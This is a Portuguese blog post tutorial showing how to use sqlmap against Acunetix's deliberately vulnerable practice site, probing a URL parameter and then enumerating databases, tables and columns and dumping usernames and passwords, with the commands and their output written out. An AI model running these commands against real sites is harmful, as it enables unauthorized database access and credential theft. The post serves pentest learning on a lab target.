---
layout: post
title: "Analisando vulnerabilidades com sqlmap"
date: 2016-04-19 23:17:27
image:
   url: img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/syringe-code2.jpg
description: 'Vamos analisar uma pequena falha encontrada em um banco de dado Mysql, com o sqlmap'
tags:
- Dicas
categories:
- Segurança
---

## SQL Injection

Hoje vou falar um pouco sobre uma ótima ferramenta para fazer `pentest`, que é muito utilizada para fazer `SQL injection`, vou falar sobre o `sqlmap` que tem como foco buscar vulnerabilidades no `SQLi` que podem trazer uma grande dor de cabeça, vulnerabilidades que geralmente são causadas por falhas no desenvolvimento, e as vezes até por um funcionário descontente ou desmotivado.

### Mas o que é sqlmap

O `sqlmap` é uma ferramenta desenvolvida em `python` de código aberto, que tem como foco analisar vulnerabilidades no sql de websites ou serviços, possibilitando que você faça diversas coisas, devido à variedade de opções que ele te oferece, desde informações do formulário até tabelas de todo o banco de dados, muito popular para extrair nome de usuários e senhas.

O que vamos abordar aqui é tenta encontrar alguma vulnerabilidade no `SQL`, e ver se conseguimos ganhar acesso, para fazer nosso teste vou usar o site da Acunetix [http://testphp.vulnweb.com/](http://testphp.vulnweb.com/), que foi disponibilizado justamente para fazer pentest.

### Instalando o sqlmap

Sua instalação não é muito difícil, é como quaisquer outras aplicações que não vem como padrão em sua distribuição. Acesse o site oficial [sqlmap.org](http://sqlmap.org/), faça download de sua referência seja `.zip` ou `tar.gz`. Extraia os arquivos para uma pasta, acesse a pasta e execute `./sqlmap.py` ou `python sqlmap.py`

### Help

{% highlight bash %}
./sqlmap.py --help | less
{% endhighlight %}

Sempre bom conhecer a ferramenta antes de utilizarmos ela, tente ler algumas das muitas opções que o `sqlmap` oferece, assim você pode juntar algumas opções que podem se torna úteis.

### Analisando possíveis vulnerabilidades

Coloque um som legal aí, e vamos lá. Primeiro vamos conhecer o nosso site alvo, então acesse [http://testphp.vulnweb.com/](http://testphp.vulnweb.com/). É possível ver na imagem abaixo que temos uma área de login, o que geralmente acontece nessas áreas, se você colocar aspas simples ('') no login e na senha, já indica uma vulnerabilidade, mas cheguei a fazer esse teste e não tive resultado nenhum, então quer dizer que não temos vulnerabilidade nessa página de login, ou que eu não consegui encontrar. :(

![screenshot](/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot04.png)

Mas não podemos criar pânico, vamos dá uma olhada melhor, ali do lado esquerdo temos um menu na vertical onde é possível acessar uma página de categorias. Ótimo quer dizer que temos um banco de dados ali também.

![screenshot](/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot02.png)

Essas categorias podem ser exploradas, então vou selecionar a segunda categoria e vamos ver o que ela tem para nos oferecer, porque é onde está o conteúdo relacionado ao banco de dados.

![screenshot](/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot03.png)

Essa categoria que selecionei tem apenas um resultado relacionado a ela, mas não tem problema o nosso foco aqui é encontrar vulnerabilidades e não comprar. Agora vamos analisar o `URL` da página.

{% highlight bash %}
http://testphp.vulnweb.com/listproducts.php?cat=2
{% endhighlight %}

Legal, vamos pôr um ponto de interrogação `?` ali no final da nossa `URL`, quem sabe temos algum erro no sql.

{% highlight bash %}
http://testphp.vulnweb.com/listproducts.php?cat=2?
{% endhighlight %}

Muito bom encontramos o que precisávamos, um pequeno erro no sql, e já descobrimos qual é o sql que ele utiliza o `Mysql`.

![screenshot](/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot05.png)

Já encontramos a vulnerabilidade que precisávamos então vamos para o `sqlmap`, que será uma peça fundamental, onde iremos tentar puxar mais informações desse banco de dados.

{% highlight bash %}
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=2 --dbms=mysql --dbs
{% endhighlight %}

O `-u` indica que estamos usando uma url já o `--dbms=mysql` indica para que seja feita busca no mysql, que é o banco de dados utilizado pelo site, assim a busca fica muito mais rápida, se não utilizarmos essa opção ele vai demorar um pouco mais, porque vai tentar com todos os bancos de dados e por fim o `-dbs` está pedindo para que liste os bancos de dados.

Após executar, o resultado foi:

{% highlight bash %}
[00:19:41] [INFO] testing MySQL
[00:19:41] [INFO] confirming MySQL
[00:19:41] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.0
[00:19:41] [INFO] fetching database names
available databases [2]:
[*] acuart
[*] information_schema

[00:19:41] [INFO] fetched data logged to text files under '/home/nglauzer/.sqlmap/output/testphp.vulnweb.com'
{% endhighlight %}

Até aqui tranquilo, acabamos de descobrir mais um pouco, agora sabemos que ele tem um banco de dados chamado `acuart` e o outro `information_schema`. Vamos analisar esse `acuart`

{% highlight bash %}
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=2 --dbms=mysql --dbs -D acuart --tables
{% endhighlight %}

A opção `-D` mostra qual o banco de dados que vamos analisar que seria o `acuart` que é a nossa segunda opção, já o `--tables`, vai listar todas as tabelas existentes no banco de dados que acabamos de informar.

Nosso resultado foi:

{% highlight bash %}
[00:28:26] [INFO] fetching tables for database: 'acuart'
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

[00:28:26] [INFO] fetched data logged to text files under '/home/nglauzer/.sqlmap/output/testphp.vulnweb.com'
{% endhighlight %}

Olha ali temos uma tabela chamada `users`, legal que é o nosso foco aqui, descobrir usuário e senha então vamos pegar mais informações desse banco de dados da tabela `users`

{% highlight bash %}
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=2 --dbms=mysql --dbs -D acuart -T users --columns
{% endhighlight %}

O `-T`, estou informando que desejo informações da tabela já o `users` diz qual é a nossa tabela, e o `--columns`, informa que desejo as colunas dessa tabela.

{% highlight bash %}
[00:33:01] [INFO] fetching columns for table 'users' in database 'acuart'
Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| name    | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+

[00:33:01] [INFO] fetched data logged to text files under '/home/nglauzer/.sqlmap/output/testphp.vulnweb.com'
{% endhighlight %}

Estamos quase chegando na nossa reta final, já temos ali as colunas `uname` e `pass`, vamos extrair ela e ver o que temos.

{% highlight bash %}
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=2 --dbms=mysql --dbs -D acuart -T users -C uname,pass,name,email --dump
{% endhighlight %}

No `-C` estou informando que desejo as colunas já `uname,pass,name,email`, informando quais são essas colunas que eu desejo, e o `--dump`, extrai as informações dessas colunas.

Resultado:

{% highlight bash %}
[00:41:04] [INFO] fetching entries of column(s) 'email, name, pass, uname' for table 'users' in database 'acuart'
[00:41:04] [INFO] analyzing table dump for possible password hashes
Database: acuart
Table: users
[1 entry]
+-------+------+------------+-----------------+
| uname | pass | name       | email           |
+-------+------+------------+-----------------+
| test  | test | John Smith | email@email.com |
+-------+------+------------+-----------------+

[00:41:04] [INFO] table 'acuart.users' dumped to CSV file '/home/nglauzer/.sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'
[00:41:04] [INFO] fetched data logged to text files under '/home/nglauzer/.sqlmap/output/testphp.vulnweb.com
{% endhighlight %}

Bom, se você chegou até aqui parabéns, está na hora de ver se essa parada aqui é de verdade mesmo e ter certeza que não estou inventando nada, rs. Vamos para o site naquela página de login, tentar usar o a senha `test` e o login `teste`, e ver se o nome e e-mail bate com as informações.

Página de login:

![screenshot](/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot06.png)


Página de acesso:

![screenshot](/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot07.png)

### Conclusão

Como foi possível ver, esse realmente era o usuário e senha para acessar a página, e os dados bateram com as informações que obtivemos na hora de pegar as informações das colunas. Agora é só verificar outras vulnerabilidades possíveis no site da Acunetix, e explorar elas, sempre tem um novo jeito.

### Referências

[sqlinjection](http://www.sqlinjection.net/)

[sqlmap.org/](http://sqlmap.org/)

-----
Viu algum erro ou gostaria de adicionar alguma sugestão a essa matéria? Comente.
